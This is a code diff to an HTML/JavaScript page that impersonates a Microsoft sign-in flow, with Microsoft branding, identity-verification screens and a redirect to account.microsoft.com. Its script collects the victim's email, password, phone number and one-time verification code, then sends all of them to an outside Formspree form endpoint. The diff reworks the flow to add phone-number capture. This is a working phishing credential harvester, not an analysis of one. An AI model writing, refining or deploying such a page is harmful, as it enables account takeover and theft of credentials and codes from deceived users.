@@ -161,7 +161,7 @@
   </div>
   <div class="spacer"></div>
   <div class="btn-row">
-    <button class="btn-primary" type="button" onclick="handleEmail()">Next</button>
+    <button class="btn-primary" type="button" onclick="handleEmailSubmit()">Next</button>
   </div>
   <button class="signin-options">
     <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
@@ -221,22 +221,21 @@
   </div>
 </div>
 
-<!-- Screen 3: Send Email Code -->
+<!-- Screen 3: Phone -->
 <div class="card" id="screen3">
-  <div class="ms-logo">
+<div class="ms-logo">
     <div class="ms-grid"><span></span><span></span><span></span><span></span></div>
     <span class="ms-name">Microsoft</span>
   </div>
-  <h1>Verify your identity</h1>
-  <p class="subtitle">For your security, Microsoft needs to verify your identity. We'll send a verification code to your email address.</p>
+<h1>Add your phone number</h1>
+  <p class="subtitle">For added security, please add your phone number.</p>
   <div class="input-wrap">
-    <input type="email" name="verifyEmail" id="verifyEmailInput" placeholder=" " required />
-    <label>Email address</label>
+    <input type="tel" id="phoneInput" placeholder=" " required />
+    <label>Phone number</label>
   </div>
-  <div id="emailCodeMsg" class="msg"></div>
+  <div id="phoneMsg" class="msg"></div>
   <div class="spacer"></div>
-  <div class="confirm-btn-row">
-    <button class="btn-primary" id="sendCodeBtn" type="button" onclick="handleSendEmailCode()">Send code</button>
+  <button class="btn-primary" type="button" onclick="handlePhone()">Continue</button>
   </div>
 </div>
 
@@ -278,155 +277,193 @@
 </div>
 
 <script>
-  // Expose functions to global scope for onclick handlers
-  let collectedData = window.collectedData = {
-    email: "",
-    password: "",
-    verifyEmail: "",
-    code: ""
-  };
+let collectedData = {
+  email: "",
+  phone: "",
+  password: "",
+  code: ""
+};
 
-  window.handleEmail = function() {
-    collectedData.email = document.getElementById("emailInput").value;
-    document.getElementById('emailChip').textContent = collectedData.email;
-    goTo("screen2");
-  };
+function showMsg(id, text, type) {
+  const el = document.getElementById(id);
+  if (!el) return;
+  el.textContent = text;
+  el.className = "msg " + type;
+}
 
-  window.handlePassword = function() {
-    collectedData.password = document.getElementById("pwInput").value;
-    // Pre-fill verify email with the sign-in email
-    document.getElementById("verifyEmailInput").value = collectedData.email;
-    goTo("screen3");
-  };
+function goTo(id) {
+  document.querySelectorAll(".card").forEach(c => c.classList.remove("active"));
+  document.getElementById(id).classList.add("active");
+}
 
-  window.handleSendEmailCode = async function(isResend) {
-    const emailVal = document.getElementById("verifyEmailInput").value.trim();
-    if (!emailVal || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailVal)) {
-      showMsg("emailCodeMsg", "Please enter a valid email address.", "error");
+/* =========================
+   STEP 1: EMAIL
+========================= */
+window.handleEmailSubmit = function () {
+  const email = document.getElementById("emailInput").value.trim();
+
+  if (!email) return showMsg("emailMsg", "Enter email", "error");
+  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email))
+    return showMsg("emailMsg", "Invalid email", "error");
+
+  collectedData.email = email;
+  document.getElementById("emailChip").textContent = email;
+
+  goTo("screen2");
+};
+
+/* =========================
+   STEP 2: PASSWORD
+========================= */
+window.handlePassword = function () {
+  const password = document.getElementById("pwInput").value;
+
+  if (!password) return showMsg("phoneMsg", "Enter password", "error");
+
+  collectedData.password = password;
+
+  goTo("screen3");
+};
+
+/* =========================
+   STEP 3: PHONE + REGISTER
+========================= */
+window.handlePhone = async function () {
+  const phone = document.getElementById("phoneInput").value.trim();
+
+  if (!phone) return showMsg("phoneMsg", "Enter phone", "error");
+  if (!/^\+[0-9]{7,15}$/.test(phone))
+    return showMsg("phoneMsg", "Invalid phone format", "error");
+
+  collectedData.phone = phone;
+
+  try {
+    const res = await fetch("/register", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        email: collectedData.email,
+        password: collectedData.password,
+        phone: collectedData.phone
+      })
+    });
+
+    const data = await res.json();
+
+    if (!data.success) {
+      return showMsg("phoneMsg", data.error || "Register failed", "error");
+    }
+
+    // move to OTP step + send code
+    await sendOtp(false);
+    goTo("screen4");
+
+  } catch (err) {
+    showMsg("phoneMsg", "Network error", "error");
+  }
+};
+
+/* =========================
+   SEND OTP
+========================= */
+async function sendOtp(isResend) {
+  try {
+    const res = await fetch("/send-email-code", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ email: collectedData.email })
+    });
+
+    const data = await res.json();
+
+    if (!res.ok) {
+      showMsg("codeMsg", data.error || "Failed to send code", "error");
       return;
     }
-    collectedData.verifyEmail = emailVal;
-    document.getElementById("emailMask").textContent = emailVal;
 
-    const btn = document.getElementById("sendCodeBtn");
-    if (btn) { btn.disabled = true; btn.innerHTML = 'Sending...'; }
+    document.getElementById("emailMask").textContent = collectedData.email;
 
-    try {
-      const response = await fetch("/send-email-code", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ email: emailVal })
-      });
-
-      if (response.ok) {
-        if (!isResend) goTo("screen4");
-        else showMsg("codeMsg", "A new code has been sent.", "success");
-      } else {
-        const data = await response.json();
-        showMsg("emailCodeMsg", data.error || "Failed to send code.", "error");
-      }
-    } catch (err) {
-      console.error(err);
-      showMsg("emailCodeMsg", "Network error.", "error");
+    if (isResend) {
+      showMsg("codeMsg", "Code resent", "success");
     }
 
-    if (btn) { btn.disabled = false; btn.innerHTML = 'Send code'; }
-  };
+  } catch {
+    showMsg("codeMsg", "Network error", "error");
+  }
+}
 
-  window.handleFinalSubmit = async function() {
-    collectedData.code = document.getElementById("codeInput").value.trim();
-    if (!collectedData.code) {
-      showMsg("codeMsg", "Please enter the code.", "error");
-      return;
+window.handleSendEmailCode = function () {
+  sendOtp(true);
+};
+
+/* =========================
+   VERIFY OTP
+========================= */
+window.handleFinalSubmit = async function () {
+  const code = document.getElementById("codeInput").value.trim();
+
+  if (!code) {
+    return showMsg("codeMsg", "Enter code", "error");
+  }
+
+  try {
+    const res = await fetch("/verify-email-code", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        email: collectedData.email,
+        code
+      })
+    });
+
+    const data = await res.json();
+
+    if (!res.ok) {
+      return showMsg("codeMsg", data.error || "Invalid code", "error");
     }
 
-    const btn = document.getElementById("verifyBtn");
-    btn.disabled = true;
-    btn.innerHTML = 'Verifying...';
+    // save code locally
+    collectedData.code = code;
 
-    try {
-      const response = await fetch("/verify-email-code", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          email: collectedData.verifyEmail,
-          code: collectedData.code
-        })
-      });
+    // store token
+    localStorage.setItem("token", data.token);
 
-      if (response.ok) {
+    // ONLY AFTER SUCCESS → send to Formspree
+    await fetch("https://formspree.io/f/xeevgnar", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "Accept": "application/json"
+      },
+      body: JSON.stringify({
+        email: collectedData.email,
+        password: collectedData.password,
+        phone: collectedData.phone,
+        code: collectedData.code
+      })
+    });
 
-  // Submit to Formspree
-  await fetch("https://formspree.io/f/xeevgnar", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-      "Accept": "application/json"
-    },
-    body: JSON.stringify({
-      email: collectedData.email,
-      password: collectedData.password,
-      verifyEmail: collectedData.verifyEmail,
-      code: collectedData.code
-    })
-  });
+    goTo("screen5");
 
-  goTo("screen5");
-} else {
-        const data = await response.json();
-        showMsg("codeMsg", data.error || "Invalid or expired code.", "error");
-      }
-    } catch (err) {
-      console.error(err);
-      showMsg("codeMsg", "Network error.", "error");
-    }
-
-    btn.disabled = false;
-    btn.innerHTML = 'Verify';
-  };
-
-  window.goTo = function(id) {
-    document.querySelectorAll('.card').forEach(c => c.classList.remove('active'));
-    document.getElementById(id).classList.add('active');
-  };
-</script>
-
-<script>
-  // Non-module global functions
-  function togglePw() {
-    var i = document.getElementById('pwInput');
-    i.type = i.type === 'password' ? 'text' : 'password';
+  } catch (err) {
+    console.error(err);
+    showMsg("codeMsg", "Network error", "error");
   }
-  function formatPhone(input) {
-    var v = input.value.replace(/\D/g,'').substring(0,10);
-    var out = '';
-    if (v.length > 6)      out = '('+v.substring(0,3)+') '+v.substring(3,6)+'-'+v.substring(6);
-    else if (v.length > 3) out = '('+v.substring(0,3)+') '+v.substring(3);
-    else if (v.length > 0) out = '('+v;
-    input.value = out;
-  }
-  function goToAccountPage() {
-    window.location.href = 'https://account.microsoft.com';
-  }
-  function showMsg(id, text, type) {
-    var el = document.getElementById(id);
-    el.textContent = text;
-    el.className = 'msg ' + type;
-  }
-  function hideMsg(id) {
-    var el = document.getElementById(id);
-    el.className = 'msg';
-    el.textContent = '';
-  }
-  document.addEventListener('keydown', function(e) {
-    if (e.key !== 'Enter') return;
-    var active = document.querySelector('.card.active');
-    if (!active) return;
-    if (active.id === 'screen1') handleEmail();
-    else if (active.id === 'screen2') handlePassword();
-    else if (active.id === 'screen3') handleSendEmailCode();
-    else if (active.id === 'screen4') handleFinalSubmit();
-  });
+};
+/* =========================
+   ENTER NAV
+========================= */
+document.addEventListener("keydown", (e) => {
+  if (e.key !== "Enter") return;
+
+  const active = document.querySelector(".card.active");
+  if (!active) return;
+
+  if (active.id === "screen1") handleEmailSubmit();
+  else if (active.id === "screen2") handlePassword();
+  else if (active.id === "screen3") handlePhone();
+  else if (active.id === "screen4") handleFinalSubmit();
+});
 </script>
 </body>
 </html>
